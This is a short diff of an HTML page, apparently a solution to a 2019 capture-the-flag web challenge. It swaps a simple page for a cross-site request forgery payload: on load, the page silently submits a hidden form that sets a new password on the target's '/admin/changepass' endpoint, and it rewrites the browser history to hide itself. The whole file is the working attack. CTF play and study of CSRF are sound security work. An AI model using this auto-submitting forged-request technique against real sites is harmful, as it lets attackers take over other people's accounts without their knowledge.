@@ -1,5 +1,9 @@
 <html>
-<body>
-  <p id="test"></p><script>document.getElementById('test').innerHTML+=window.location;</script>
-</body>
+  <body onload="document.createElement('form').submit.call(document.getElementById('evilForm'))">
+  <script>history.pushState('', '', '/')</script>
+    <form id="evilForm" action="https://giant_url.2019.chall.actf.co/admin/changepass" method="POST">
+      <input type="hidden" name="password" value="qwertyuiopasdfghjkl" />
+      <input type="submit" value="Submit request" />
+    </form>
+  </body>
 </html>
